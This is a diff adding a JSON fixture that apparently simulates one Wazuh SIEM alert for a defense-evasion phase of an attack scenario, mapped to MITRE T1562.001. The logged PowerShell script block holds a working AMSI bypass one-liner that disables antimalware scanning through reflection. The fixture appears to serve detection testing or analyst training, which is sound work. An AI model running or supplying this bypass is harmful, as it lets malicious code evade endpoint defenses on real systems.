@@ -1,0 +1,76 @@
+{
+  "_metadata": {
+    "phase": "defense-evasion",
+    "phase_index": 4,
+    "total_logs": 1,
+    "techniques": [
+      "T1562.001"
+    ]
+  },
+  "logs": [
+    {
+      "_comment": "AMSI bypass attempt",
+      "sequence": 11,
+      "timestamp": "2026-02-24T08:01:01.124270Z",
+      "attack_phase": "defense-evasion",
+      "technique": "T1562.001",
+      "host": "WS01",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "PowerShell ScriptBlock logging (Event 4104)",
+          "id": "100400",
+          "mitre": {
+            "id": [
+              "T1562.001"
+            ],
+            "tactic": [
+              "Defense Evasion"
+            ],
+            "technique": [
+              "T1562.001"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "windows",
+            "powershell"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "WS01",
+          "ip": "10.0.10.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "4104",
+              "channel": "Microsoft-Windows-PowerShell/Operational",
+              "providerName": "Microsoft-Windows-PowerShell",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "4104",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "messageNumber": "1",
+              "messageTotal": "1",
+              "scriptBlockText": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
+              "scriptBlockId": "{FD12E5CD-WS01-0008-3E21AAB0E5B5}",
+              "path": ""
+            }
+          }
+        }
+      }
+    }
+  ]
+}
